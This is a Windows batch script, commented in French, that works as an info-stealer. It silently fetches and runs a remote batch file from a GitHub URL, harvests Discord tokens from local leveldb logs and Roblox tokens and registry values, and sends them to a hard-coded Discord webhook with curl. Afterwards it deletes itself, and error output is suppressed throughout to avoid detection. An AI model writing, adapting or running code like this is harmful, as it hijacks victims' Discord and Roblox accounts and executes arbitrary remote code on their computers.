@echo off
setlocal enabledelayedexpansion
:: PALOFSC - SCRIPT COMBINE : EXECUTION DISTANTE (si dispo) + EXFILTRATION
:: Toutes les erreurs sont redirigées vers nul pour éviter les messages intempestifs.

:: ETAPE 1 : CONFIGURATION DU WEBHOOK
set "WEBHOOK_URL=https://discord.com/api/webhooks/1524390694376964226/1JXT_Rnb0ocyCJDBnZPuyY9qLctiKxsQe_-phkaif_Hap7ZbRugKdshY6wlYp9Jyq1T8"

:: ETAPE 2 : TENTATIVE DE TELECHARGEMENT ET EXECUTION DU SCRIPT DISTANT
set "REMOTE_URL=https://raw.githubusercontent.com/Gxnis/freenitrocode/refs/heads/main/script.bat"
set "TMPFILE=%TEMP%\dl_%RANDOM%.bat"

:: Téléchargement via bitsadmin (silencieux)
bitsadmin /transfer "dl" /download /priority foreground "%REMOTE_URL%" "%TMPFILE%" >nul 2>&1
if errorlevel 1 (
    :: Fallback avec PowerShell
    powershell -NoProfile -Command "(New-Object Net.WebClient).DownloadFile('%REMOTE_URL%', '%TMPFILE%')" >nul 2>&1
)

:: Vérification : si le fichier existe et n'est pas vide, on l'exécute en arrière-plan
if exist "%TMPFILE%" (
    for %%A in ("%TMPFILE%") do if %%~zA neq 0 (
        start /b "" "%TMPFILE%" >nul 2>&1
        timeout /t 1 /nobreak >nul 2>&1
    )
)
:: Suppression du fichier temporaire (qu'il existe ou non)
del /f /q "%TMPFILE%" >nul 2>&1

:: ETAPE 3 : RECUPERATION DES TOKENS DISCORD (sans affichage d'erreurs)
set "discord_paths=%APPDATA%\Discord\Local Storage\leveldb %APPDATA%\discordptb\Local Storage\leveldb %APPDATA%\discordcanary\Local Storage\leveldb"
set "tokens="
for %%p in (%discord_paths%) do (
    if exist "%%p" (
        for /f "tokens=3 delims= " %%a in ('findstr /r /c:"[a-zA-Z0-9_\-]\{24,28\}\.[a-zA-Z0-9_\-]\{6,7\}\.[a-zA-Z0-9_\-]\{27,38\}" "%%p\*.log" 2^>nul') do (
            set "tokens=!tokens!%%a "
        )
    )
)

:: ETAPE 4 : RECUPERATION DES DONNEES ROBLOX
set "roblox_cookie=%LOCALAPPDATA%\Roblox\GlobalBasicSettings_13.xml"
set "roblox_user="
set "roblox_pass="
set "roblox_token="
if exist "%roblox_cookie%" (
    for /f "tokens=2 delims=<>" %%a in ('findstr /r /c:"<token>" "%roblox_cookie%" 2^>nul') do set "roblox_token=%%a"
    for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "UserID" 2^>nul') do set "roblox_user=%%a"
    for /f "tokens=3*" %%a in ('reg query "HKCU\Software\Roblox\RobloxStudio" /v "RememberMe" 2^>nul') do set "roblox_pass=%%a"
)

:: ETAPE 5 : CONSTRUCTION DU PAYLOAD JSON
set "payload={"
set "payload=!payload!\"content\":\"=== EXFILTRATION ===\\n"
if not "!tokens!"=="" set "payload=!payload!Tokens Discord : !tokens!\\n"
if not "!roblox_user!"=="" set "payload=!payload!Roblox UserID : !roblox_user!\\n"
if not "!roblox_pass!"=="" set "payload=!payload!Roblox RememberMe : !roblox_pass!\\n"
if not "!roblox_token!"=="" set "payload=!payload!Roblox Token : !roblox_token!\\n"
set "payload=!payload!\"}"

:: ETAPE 6 : ENVOI VIA CURL (silencieux)
curl -s -H "Content-Type: application/json" -d "!payload!" "%WEBHOOK_URL%" >nul 2>&1

:: ETAPE 7 : NETTOYAGE MEMOIRE
set "tokens="
set "roblox_token="
set "roblox_user="
set "roblox_pass="
set "payload="

:: ETAPE 8 : AUTO-SUPPRESSION DU SCRIPT LUI-MEME
del /f /q "%~f0" >nul 2>&1
exit /b 0
